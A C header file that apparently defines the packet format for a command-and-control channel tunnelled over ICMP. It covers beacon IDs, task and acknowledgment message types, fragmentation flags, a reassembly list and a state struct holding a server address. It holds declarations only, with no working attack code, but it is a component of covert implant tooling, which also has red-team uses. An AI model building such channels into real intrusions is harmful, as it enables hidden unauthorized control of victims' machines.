#pragma once
// 20 byte ip header + 8 byte icmp header leaves 65507 bytes for payload
#define MAX_ICMP_PAYLOAD_SIZE 65507
#define MAX_ICMP_PACKET_SIZE  65535
#define FRAGMENTED            0x00000001
#define FIRST_FRAG            0x00000010
#define LAST_FRAG             0x00000100
#define FETCH_FRAG            0x00001000
#define TYPE_BEACON_DATA      0L
#define TYPE_REQUEST_TS_REPLY 1L
#define TYPE_ACK              2L
#define TYPE_TASK             3L

typedef struct _ICMP_HEADER {
    DWORD Type;           // One of a number of predefined data types above
    DWORD Identifier;     // Beacon id
    DWORD Flags;          // Mask value that indicates fragmentation or not
    DWORD FragmentIndex;  // Specify which frag to fetch
} ICMP_HEADER, * PICMP_HEADER;

// Node structure for the linked list
typedef struct PacketNode {
    void* data;              // Pointer to allocated memory
    UINT32 size;             // Size of allocated memory
    struct PacketNode* next; // Pointer to next node
} PacketNode;

// Linked list structure
typedef struct PacketList {
    PacketNode* head; // Pointer to the first node
    PacketNode* tail; // Pointer to the last node
} PacketList;

// Error codes
#define UDC2_SUCCESS                 0
#define UDC2_ERROR_INVALID_PARAM    -1
#define UDC2_ERROR_MEMORY_ALLOC     -2
#define UDC2_ERROR_NETWORK          -3
#define UDC2_ERROR_TIMEOUT          -4
#define UDC2_ERROR_PROTOCOL         -5
#define UDC2_ERROR_FRAGMENTATION    -6

// Config constants
#define MAX_RETRY_ATTEMPTS          3
#define ICMP_TIMEOUT_MS             1000
#define MIN_VALID_PACKET_SIZE       sizeof(ICMP_HEADER)
#define MAX_FRAME_SIZE              (1024 * 1024)  // 1MB max limit
#define BEACON_ID_MASK              0x0000FFFF     // Use lower 16 bits for beacon ID. We don't really need to use this.

// Global state struct
typedef struct _UDC2_STATE {
    PacketList packetList;
    ULONG beaconId;
    const char* serverAddr;
    BOOL initialized;
} UDC2_STATE, * PUDC2_STATE;